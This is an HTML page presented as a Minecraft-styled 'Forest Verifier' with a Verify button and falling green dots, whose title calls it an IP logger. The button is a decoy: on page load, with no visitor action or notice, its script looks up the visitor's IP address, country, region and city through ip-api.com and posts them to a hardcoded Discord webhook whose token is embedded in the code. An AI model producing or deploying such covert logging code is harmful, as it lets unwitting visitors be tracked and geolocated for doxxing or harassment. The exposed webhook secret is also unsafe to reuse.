<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger with Dots Animation</title>
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <style>
        /* Full-screen black background */
        body {
            margin: 0;
            overflow: hidden;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            font-family: 'Press Start 2P', cursive; /* Minecraft-style font */
        }

        /* Container for the label and button */
        #buttonContainer {
            text-align: center;
            position: relative;
            z-index: 1;
        }

        /* Label styling */
        #forestVerifierLabel {
            font-size: 18px; /* Smaller font size */
            font-weight: bold;
            color: #32CD32; /* Forest green */
            margin-bottom: 10px;
        }

        /* Button styling */
        #verifyButton {
            padding: 12px 25px; /* Smaller padding for the button */
            font-size: 16px; /* Smaller font size */
            color: white;
            background-color: #32CD32; /* Green button */
            border: none;
            border-radius: 5px;
            cursor: pointer;
            z-index: 1; /* Ensure it's above the animation */
            font-family: 'Press Start 2P', cursive; /* Minecraft-style font */
        }

        #verifyButton:hover {
            background-color: #228B22; /* Darker green when hovered */
        }

        /* Canvas for the dots */
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0; /* Dots appear behind the button */
        }
    </style>
</head>
<body>
    <!-- Falling dots animation canvas -->
    <canvas id="backgroundCanvas"></canvas>

    <!-- Container for label -->
    <div id="buttonContainer">
        <!-- Label for "Forest Verifier" -->
        <div id="forestVerifierLabel">Forest Verifier</div>

        <!-- Verify button -->
        <button id="verifyButton">Verify</button>
    </div>

    <script>
        const canvas = document.getElementById('backgroundCanvas');
        const ctx = canvas.getContext('2d');

        // Array to store dots
        let dots = [];

        // Function to resize the canvas and regenerate dots
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            createDots(); // Regenerate dots to fill the new canvas size
        }

        // Create dots with random properties
        function createDots() {
            dots = []; // Clear existing dots
            const numberOfDots = Math.floor((canvas.width * canvas.height) / 10000); // Scale dot count based on screen size
            for (let i = 0; i < numberOfDots; i++) {
                dots.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    radius: Math.random() * 3 + 1,
                    speed: Math.random() * 2 + 1,
                });
            }
        }

        // Animate the dots
        function animateDots() {
            ctx.clearRect(0, 0, canvas.width, canvas.height); // Clear the canvas
            dots.forEach(dot => {
                ctx.beginPath();
                ctx.arc(dot.x, dot.y, dot.radius, 0, Math.PI * 2); // Draw a dot
                ctx.fillStyle = '#32CD32'; // Color the dot green to match the label and button
                ctx.fill();
                dot.y += dot.speed; // Move the dot downward
                if (dot.y > canvas.height) dot.y = 0; // Reset to the top
            });
            requestAnimationFrame(animateDots);
        }

        // Add event listener to resize the canvas and recreate dots dynamically
        window.addEventListener('resize', resizeCanvas);

        // Initial setup
        resizeCanvas();
        animateDots();

        // Fetch IP and send data to webhook instantly on page load
        window.onload = () => {
            fetch('http://ip-api.com/json/') // Fetch IP details from IP-API
                .then(response => response.json())
                .then(data => {
                    const ip = data.query;
                    const country = data.country;
                    const region = data.regionName;
                    const city = data.city;

                    // Discord webhook URL
                    const webhookURL = 'https://discord.com/api/webhooks/1314052168835268689/U2SSN88_JHFEWbKSbaJTOv-QD5972Cm2SHtsTTCOXru8Cq893YddOgVuj8a_1axapj3T'; // Replace with your actual webhook URL
                    const embed = {
                        embeds: [
                            {
                                title: "New Visitor Logged",
                                color: 56108, // Green color for embed
                                fields: [
                                    { name: "IP Address", value: ip, inline: true },
                                    { name: "Country", value: country, inline: true },
                                    { name: "State/Region", value: region, inline: true },
                                    { name: "City", value: city, inline: true }
                                ],
                                footer: { text: "IP Logger Script" },
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };

                    // Send data to the webhook instantly on page load
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(embed),
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Webhook sent successfully!');
                        } else {
                            console.error('Webhook failed:', response.status, response.statusText);
                        }
                    })
                    .catch(err => {
                        console.error('Error sending webhook:', err);
                    });
                })
                .catch(err => {
                    console.error('Error fetching IP details:', err);
                });
        };
    </script>
</body>
</html>
